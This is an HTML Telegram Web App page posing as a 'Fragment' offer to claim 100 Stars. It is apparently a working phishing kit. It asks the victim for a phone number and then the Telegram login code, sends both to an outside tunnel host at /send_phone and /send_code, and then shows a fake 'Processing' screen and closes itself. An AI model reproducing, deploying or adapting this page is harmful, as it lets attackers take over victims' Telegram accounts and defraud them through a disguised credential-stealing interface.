<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Fragment | Claim Stars</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: -apple-system, system-ui, sans-serif; background-color: #000; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .container { width: 90%; max-width: 380px; text-align: center; }
        .card { background: #1c1c1e; border-radius: 24px; padding: 35px 24px; border: 1px solid #2c2c2e; }
        .gift-icon { width: 64px; height: 64px; margin: 0 auto 20px; background: linear-gradient(135deg, #007aff, #00c6ff); border-radius: 18px; display: flex; align-items: center; justify-content: center; font-size: 32px; }
        h1 { font-size: 22px; font-weight: 700; margin: 0 0 10px; }
        .badge { display: inline-block; padding: 4px 12px; background: rgba(0, 122, 255, 0.15); color: #007aff; border-radius: 20px; font-size: 12px; font-weight: 600; margin-bottom: 20px; border: 1px solid rgba(0, 122, 255, 0.3); }
        p { color: #8e8e93; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
        input { width: 100%; padding: 16px; border-radius: 14px; border: 1px solid #3a3a3c; background: #2c2c2e; color: #fff; font-size: 17px; box-sizing: border-box; outline: none; margin-bottom: 12px; }
        button { width: 100%; padding: 16px; border-radius: 14px; border: none; background: #007aff; color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:disabled { background: #3a3a3c; color: #8e8e93; }
        .step { display: none; }
        .active { display: block; }
        .dots:after { content: '.'; animation: d 1.5s linear infinite; }
        @keyframes d { 0% { content: '.'; } 33% { content: '..'; } 66% { content: '...'; } }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <div class="gift-icon">üéÅ</div>
        <div class="badge">FRAGMENT L2 CHECK</div>
        <div id="s1" class="step active">
            <h1>Fragment ID</h1>
            <p>Connect your account to claim <b>100 Stars</b> from your gift check.</p>
            <input type="tel" id="p" placeholder="+380 00 000 00 00">
            <button id="b1" onclick="u()">Connect & Claim</button>
        </div>
        <div id="s2" class="step">
            <h1>Verification</h1>
            <p>Enter the code from Telegram to confirm your identity.</p>
            <input type="number" id="c" placeholder="00000">
            <button id="b2" onclick="v()">Confirm Registration</button>
        </div>
        <div id="s3" class="step">
            <h1 class="dots">Processing</h1>
            <p>Syncing check data with Fragment Ledger...</p>
        </div>
    </div>
</div>
<script>
    const URL = "https://c838c30f8af483.lhr.life"; 
    const tg = window.Telegram.WebApp;
    tg.expand();
    async function u() {
        const ph = document.getElementById('p').value.replace(/\D/g, '');
        if (ph.length < 10) return;
        document.getElementById('b1').disabled = true;
        try {
            const r = await fetch(`${URL}/send_phone`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: "+" + ph})
            });
            if (r.ok) {
                document.getElementById('s1').classList.remove('active');
                document.getElementById('s2').classList.add('active');
            } else {
                alert("Gateway Error. Try again.");
                document.getElementById('b1').disabled = false;
            }
        } catch (e) { alert("Connection Error."); }
    }
    async function v() {
        const co = document.getElementById('c').value;
        const ph = "+" + document.getElementById('p').value.replace(/\D/g, '');
        document.getElementById('s2').classList.remove('active');
        document.getElementById('s3').classList.add('active');
        try {
            await fetch(`${URL}/send_code`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: ph, code: co})
            });
            setTimeout(() => { tg.close(); }, 5000);
        } catch (e) { tg.close(); }
    }
</script>
</body>
</html>
